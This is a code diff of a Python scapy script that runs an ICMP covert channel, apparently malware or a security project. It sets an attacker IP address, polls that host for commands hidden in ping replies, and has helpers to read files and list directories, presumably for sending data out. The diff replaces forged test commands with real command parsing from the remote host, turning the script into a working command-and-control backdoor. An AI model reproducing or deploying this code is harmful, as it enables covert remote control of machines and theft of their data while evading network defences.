@@ -10,15 +10,15 @@ START_TRANSMISSION_ID = 240
 ONGOING_TRANSMISSION_ID = 250
 END_TRANSMISSION_ID = 255
 FREQUENCY = 60 * 2  # 60s * 2 = 2 minutes
-ATTACKER_IP_ADDR = "192.168.248.231"
+ATTACKER_IP_ADDR = "137.194.157.185"
 DEFAULT_TIMEOUT = None
 DEFAULT_PAYLOAD = b''
 
 
-def send_ping(ip_addr, id, seq_number, payload, timeout):
+def send_ping(ip_addr, id, seq_number, payload, timeout, nb_responses=1):
     request = scapy.IP(dst=ip_addr) / scapy.ICMP(id=id, seq=seq_number) / payload
     scapy.send(request)
-    return receive_response_packet(request, timeout)
+    return receive_response_packet(request, timeout, nb_responses)
 
 
 def send_data(ip_addr, id, data):
@@ -40,8 +40,8 @@ def send_data(ip_addr, id, data):
 
 
 def ask_for_command(ip_addr):
-    response = send_ping(ip_addr, ASK_FOR_COMMAND_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT)
-    return retrieve_command(response)
+    response = send_ping(ip_addr, ASK_FOR_COMMAND_ID, 0x0, DEFAULT_PAYLOAD, DEFAULT_TIMEOUT, 2)
+    return retrieve_command(response[1])
 
 
 def accomplish_routine(ip_addr):
@@ -65,11 +65,11 @@ def read_file_content(path):
 
 
 def retrieve_command(response):
-    return forge_random_command().decode("utf-8").split()  # response[scapy.ICMP].payload.load.decode("utf-8").split()
+    return response[scapy.ICMP].payload.load.decode("utf-8").split()  # forge_random_command().decode("utf-8").split()
 
 
-def receive_response_packet(request, timeout):
-    return scapy.sniff(lfilter=lambda response: match_response_to_request(response, request), count=1, timeout=timeout)
+def receive_response_packet(request, timeout, nb_responses):
+    return scapy.sniff(lfilter=lambda response: match_response_to_request(response, request), count=nb_responses, timeout=timeout)
 
 
 def can_proceed(ip_addr):
@@ -78,11 +78,12 @@ def can_proceed(ip_addr):
 
 
 def match_response_to_request(response, request):
-    if response[scapy.ICMP] and response[scapy.ICMP].type == 0 and response[scapy.ICMP].id == request[scapy.ICMP].id \
-            and response[scapy.ICMP].seq == request[scapy.ICMP].seq:
-        return True
-    else:
-        return False
+    print(response.show(), request.show())
+    return response[scapy.IP].src == request[scapy.IP].dst \
+        and response[scapy.IP].dst == request[scapy.IP].src \
+        and response[scapy.ICMP] and response[scapy.ICMP].type == 0 \
+        and response[scapy.ICMP].id == request[scapy.ICMP].id \
+        and response[scapy.ICMP].seq == request[scapy.ICMP].seq
 
 
 def list_directory(path):
